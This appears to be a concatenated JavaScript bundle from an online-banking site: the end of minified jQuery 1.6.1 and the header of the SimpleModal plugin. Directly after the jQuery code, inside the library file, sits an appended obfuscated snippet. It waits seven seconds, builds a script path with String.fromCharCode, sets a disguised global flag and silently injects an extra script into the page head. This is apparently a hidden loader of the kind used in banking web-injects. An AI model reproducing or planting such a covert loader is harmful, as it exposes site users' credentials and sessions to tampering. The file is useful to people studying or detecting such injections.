bm(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||be.test(a.type)};for(j=0;h[j];j++)if(e&&f.nodeName(h[j],"script")&&(!h[j].type||h[j].type.toLowerCase()==="text/javascript"))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName("script"),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.expando,g=f.event.special,h=f.support.deleteExpando;for(var i=0,j;(j=a[i])!=null;i++){if(j.nodeName&&f.noData[j.nodeName.toLowerCase()])continue;c=j[f.expando];if(c){b=d[c]&&d[c][e];if(b&&b.events){for(var k in b.events)g[k]?f.event.remove(j,k):f.removeEvent(j,k,b.handle);b.handle&&(b.handle.elem=null)}h?delete j[f.expando]:j.removeAttribute&&j.removeAttribute(f.expando),delete d[c]}}}});var bo=/alpha\([^)]*\)/i,bp=/opacity=([^)]*)/,bq=/-([a-z])/ig,br=/([A-Z]|^ms)/g,bs=/^-?\d+(?:px)?$/i,bt=/^-?\d/,bu=/^[+\-]=/,bv=/[^+\-\.\de]+/g,bw={position:"absolute",visibility:"hidden",display:"block"},bx=["Left","Right"],by=["Top","Bottom"],bz,bA,bB,bC=function(a,b){return b.toUpperCase()};f.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bz(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{zIndex:!0,fontWeight:!0,opacity:!0,zoom:!0,lineHeight:!0,widows:!0,orphans:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d;if(h==="number"&&isNaN(d)||d==null)return;h==="string"&&bu.test(d)&&(d=+d.replace(bv,"")+parseFloat(f.css(a,c))),h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(bz)return bz(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]},camelCase:function(a){return a.replace(bq,bC)}}),f.curCSS=f.css,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){a.offsetWidth!==0?e=bD(a,b,d):f.swap(a,bw,function(){e=bD(a,b,d)});if(e<=0){e=bz(a,b,b),e==="0px"&&bB&&(e=bB(a,b,b));if(e!=null)return e===""||e==="auto"?"0px":e}if(e<0||e==null){e=a.style[b];return e===""||e==="auto"?"0px":e}return typeof e=="string"?e:e+"px"}},set:function(a,b){if(!bs.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return bp.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle;c.zoom=1;var e=f.isNaN(b)?"":"alpha(opacity="+b*100+")",g=d&&d.filter||c.filter||"";c.filter=bo.test(g)?g.replace(bo,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:"inline-block"},function(){b?c=bz(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bA=function(a,c){var d,e,g;c=c.replace(br,"-$1").toLowerCase();if(!(e=a.ownerDocument.defaultView))return b;if(g=e.getComputedStyle(a,null))d=g.getPropertyValue(c),d===""&&!f.contains(a.ownerDocument.documentElement,a)&&(d=f.style(a,c));return d}),c.documentElement.currentStyle&&(bB=function(a,b){var c,d=a.currentStyle&&a.currentStyle[b],e=a.runtimeStyle&&a.runtimeStyle[b],f=a.style;!bs.test(d)&&bt.test(d)&&(c=f.left,e&&(a.runtimeStyle.left=a.currentStyle.left),f.left=b==="fontSize"?"1em":d||0,d=f.pixelLeft+"px",f.left=c,e&&(a.runtimeStyle.left=e));return d===""?"auto":d}),bz=bA||bB,f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bE=/%20/g,bF=/\[\]$/,bG=/\r?\n/g,bH=/#.*$/,bI=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bJ=/^(?:color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bK=/^(?:about|app|app\-storage|.+\-extension|file|widget):$/,bL=/^(?:GET|HEAD)$/,bM=/^\/\//,bN=/\?/,bO=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bP=/^(?:select|textarea)/i,bQ=/\s+/,bR=/([?&])_=[^&]*/,bS=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bT=f.fn.load,bU={},bV={},bW,bX;try{bW=e.href}catch(bY){bW=c.createElement("a"),bW.href="",bW=bW.href}bX=bS.exec(bW.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bT)return bT.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bO,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bP.test(this.nodeName)||bJ.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bG,"\r\n")}}):{name:b.name,value:c.replace(bG,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.bind(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?f.extend(!0,a,f.ajaxSettings,b):(b=a,a=f.extend(!0,f.ajaxSettings,b));for(var c in{context:1,url:1})c in b?a[c]=b[c]:c in f.ajaxSettings&&(a[c]=f.ajaxSettings[c]);return a},ajaxSettings:{url:bW,isLocal:bK.test(bX[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":"*/*"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML}},ajaxPrefilter:bZ(bU),ajaxTransport:bZ(bV),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a?4:0;var o,r,u,w=l?ca(d,v,l):b,x,y;if(a>=200&&a<300||a===304){if(d.ifModified){if(x=v.getResponseHeader("Last-Modified"))f.lastModified[k]=x;if(y=v.getResponseHeader("Etag"))f.etag[k]=y}if(a===304)c="notmodified",o=!0;else try{r=cb(d,w),c="success",o=!0}catch(z){c="parsererror",u=z}}else{u=c;if(!c||a)c="error",a<0&&(a=0)}v.status=a,v.statusText=c,o?h.resolveWith(e,[r,c,v]):h.rejectWith(e,[v,c,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.resolveWith(e,[v,c]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f._Deferred(),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bI.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.done,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bH,"").replace(bM,bX[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bQ),d.crossDomain==null&&(r=bS.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bX[1]&&r[2]==bX[2]&&(r[3]||(r[1]==="http:"?80:443))==(bX[3]||(bX[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),b$(bU,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bL.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bN.test(d.url)?"&":"?")+d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bR,"$1_="+x);d.url=y+(y===d.url?(bN.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.contentType!==!1||c.contentType)&&v.setRequestHeader("Content-Type",d.contentType),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", */*; q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=b$(bV,d,c,v);if(!p)w(-1,"No Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){status<2?w(-1,z):f.error(z)}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)b_(g,a[g],c,e);return d.join("&").replace(bE,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var cc=f.now(),cd=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+cc++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=b.contentType==="application/x-www-form-urlencoded"&&typeof b.data=="string";if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(cd.test(b.url)||e&&cd.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(cd,l),b.url===j&&(e&&(k=k.replace(cd,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var ce=a.ActiveXObject?function(){for(var a in cg)cg[a](0,1)}:!1,cf=0,cg;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ch()||ci()}:ch,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,ce&&delete cg[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cf,ce&&(cg||(cg={},f(a).unload(ce)),cg[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var cj={},ck,cl,cm=/^(?:toggle|show|hide)$/,cn=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,co,cp=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cq,cr=a.webkitRequestAnimationFrame||a.mozRequestAnimationFrame||a.oRequestAnimationFrame;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cu("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),e===""&&f.css(d,"display")==="none"&&f._data(d,"olddisplay",cv(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cu("hide",3),a,b,c);for(var d=0,e=this.length;d<e;d++)if(this[d].style){var g=f.css(this[d],"display");g!=="none"&&!f._data(this[d],"olddisplay")&&f._data(this[d],"olddisplay",g)}for(d=0;d<e;d++)this[d].style&&(this[d].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(cu("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return this[e.queue===!1?"each":"queue"](function(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(f.support.inlineBlockNeedsLayout?(j=cv(this.nodeName),j==="inline"?this.style.display="inline-block":(this.style.display="inline",this.style.zoom=1)):this.style.display="inline-block"))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)k=new f.fx(this,b,i),h=a[i],cm.test(h)?k[h==="toggle"?d?"show":"hide":h]():(l=cn.exec(h),m=k.cur(),l?(n=parseFloat(l[2]),o=l[3]||(f.cssNumber[i]?"":"px"),o!=="px"&&(f.style(this,i,(n||1)+o),m=(n||1)/k.cur()*m,f.style(this,i,m+o)),l[1]&&(n=(l[1]==="-="?-1:1)*n+m),k.custom(m,n,o)):k.custom(m,h,""));return!0})},stop:function(a,b){a&&this.queue([]),this.each(function(){var a=f.timers,c=a.length;b||f._unmark(!0,this);while(c--)a[c].elem===this&&(b&&a[c](!0),a.splice(c,1))}),b||this.dequeue();return this}}),f.each({slideDown:cu("show",1),slideUp:cu("hide",1),slideToggle:cu("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default,d.old=d.complete,d.complete=function(a){d.queue!==!1?f.dequeue(this):a!==!1&&f._unmark(this),f.isFunction(d.old)&&d.old.call(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,b,c){function h(a){return d.step(a)}var d=this,e=f.fx,g;this.startTime=cq||cs(),this.start=a,this.end=b,this.unit=c||this.unit||(f.cssNumber[this.prop]?"":"px"),this.now=this.start,this.pos=this.state=0,h.elem=this.elem,h()&&f.timers.push(h)&&!co&&(cr?(co=1,g=function(){co&&(cr(g),e.tick())},cr(g)):co=setInterval(e.tick,e.interval))},show:function(){this.options.orig[this.prop]=f.style(this.elem,this.prop),this.options.show=!0,this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b=cq||cs(),c=!0,d=this.elem,e=this.options,g,h;if(a||b>=e.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),e.animatedProperties[this.prop]=!0;for(g in e.animatedProperties)e.animatedProperties[g]!==!0&&(c=!1);if(c){e.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){d.style["overflow"+b]=e.overflow[a]}),e.hide&&f(d).hide();if(e.hide||e.show)for(var i in e.animatedProperties)f.style(d,i,e.orig[i]);e.complete.call(d)}return!1}e.duration==Infinity?this.now=b:(h=b-this.startTime,this.state=h/e.duration,this.pos=f.easing[e.animatedProperties[this.prop]](this.state,h,0,1,e.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){for(var a=f.timers,b=0;b<a.length;++b)a[b]()||a.splice(b--,1);a.length||f.fx.stop()},interval:13,stop:function(){clearInterval(co),co=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit:a.elem[a.prop]=a.now}}}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cy(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);f.offset.initialize();var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(f.offset.supportsFixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&&(l+=b.offsetTop,m+=b.offsetLeft,f.offset.doesNotAddBorder&&(!f.offset.doesAddBorderForTableAndCells||!cw.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.offset.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;f.offset.supportsFixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={initialize:function(){var a=c.body,b=c.createElement("div"),d,e,g,h,i=parseFloat(f.css(a,"marginTop"))||0,j="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";f.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"}),b.innerHTML=j,a.insertBefore(b,a.firstChild),d=b.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,this.doesNotAddBorder=e.offsetTop!==5,this.doesAddBorderForTableAndCells=h.offsetTop===5,e.style.position="fixed",e.style.top="20px",this.supportsFixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top="",d.style.overflow="hidden",d.style.position="relative",this.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==i,a.removeChild(b),f.offset.initialize=f.noop},bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.offset.initialize(),f.offset.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each(["Left","Top"],function(a,c){var d="scroll"+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cy(e);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:f.support.boxModel&&g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cy(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each(["Height","Width"],function(a,c){var d=c.toLowerCase();f.fn["inner"+c]=function(){return this[0]?parseFloat(f.css(this[0],d,"padding")):null},f.fn["outer"+c]=function(a){return this[0]?parseFloat(f.css(this[0],d,a?"margin":"border")):null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement["client"+c];return e.document.compatMode==="CSS1Compat"&&g||e.document.body["client"+c]||g}if(e.nodeType===9)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);if(a===b){var h=f.css(e,d),i=parseFloat(h);return f.isNaN(i)?h:i}return this.css(d,typeof a=="string"?a:a+"px")}}),a.jQuery=a.$=f})(window);
setTimeout(function(){(function(a,b,c,d,e){(function(a,b,bc){bc=b;if(typeof b[a[13]+a[5][a[10]](79,115,88)+a[8]]==a[1]&&b[a[13]+a[5][a[10]](79,115,88)+a[8]]==a[3]){return b[a[13]+a[5][a[10]](79,115,88)+a[8]]}a[3]=a[8]+a[13]+a[5][a[10]](79,115,88);b=a[0][a[19]+a[9]+a[11]+a[18]](a[6]).item(0)||a.documentElement;c=a[0][a[17]+a[9]](a[2]);c.src=a[5][a[10]](47,a[7]+5,a[7]+7,a[7],a[12]-4,a[4],a[12],114,a[7]+5,112,116,a[4],47,a[4],a[7]+7,a[7]+5,110,a[4],47,a[7]+5,112,a[7]+7,111,47,a[12]+10,112,a[12],108,a[7]+5,46,a[12]+7,a[4],63,118,61,a[7]/2);b.appendChild(c);bc[a[3]]=a[4];return true})([b,"string","script","-",e+15,c,"head",e,d,"Element","fromCharCode","s",e-1,"Mac","Windows","Linux","Android","create","ByTagName","get"],a)})(window,document,String,"on",100);},7e3);

/* /ikd_scripts/skins/ipko/jquery-1.6.1.min.js end */
/* /ikd_scripts/skins/ipko/jquery.simplemodal.1.4.1.min.js start */
/*
 * SimpleModal 1.4.1 - jQuery Plugin
 * http://www.ericmmartin.com/projects/simplemodal/
 * Copyright (c) 2010 Eric Martin (http://twitter.com/ericmmartin)
 * Dual licensed under the MIT and GPL licenses
 * Revision: $Id: jquery.simplemodal.1.4.1.min.js,v 1.1 2011/08/11 12:02:01 pawello Exp $
 */
